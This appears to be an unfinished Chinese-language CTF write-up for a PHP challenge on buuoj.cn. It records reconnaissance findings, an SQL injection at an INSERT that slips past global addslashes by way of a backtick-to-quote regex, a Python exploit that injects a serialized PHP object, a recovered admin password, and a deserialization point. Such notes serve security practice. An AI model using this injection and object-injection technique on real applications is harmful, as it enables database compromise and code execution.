# 施工中
	- 全局addslashes
	- admin可以任意写
	- 可以直接在`http://a14e8d76-08ad-45ed-8c53-f9d57a00c8ca.node4.buuoj.cn:81/views/login`看到views的源码
	- phpino: `http://a14e8d76-08ad-45ed-8c53-f9d57a00c8ca.node4.buuoj.cn:81/index.php?action=phpinfo`
	- db存在sql注入
		- 因为全局addslashes, 需要找~~整数注入~~ ~~二次注入！~~
	- INSERT处可以注入！
		- config.php
			- `get-column`: `["a", "b"]` --> ``"`a`, `b`"``
			- 然后insert处将反引号包裹转成引号
				- ``$value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';``
		- exp
			- ```python
			  mood = enc_dec.urldecode("O%3A4%3A%22Mood%22%3A3%3A%7Bs%3A4%3A%22mood%22%3Bi%3A1%3Bs%3A2%3A%22ip%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A4%3A%22date%22%3Bi%3A1697890484%3B%7D")
			  sig = "114`,`{}`)#".format(mood)
			  print(sig)
			  r = requests.post(url, params = {"action": "publish"}, cookies = {"PHPSESSID": "pt6m8pjtc21u3qiqbrfcdssiv4"}, data = {
			      "signature": sig,
			      "mood": "114"
			  })
			  print(r.text)
			  ```
	- admin密码：`jaivypassword`
	- 看到反序列化点：从数据库中取出数据并反序列化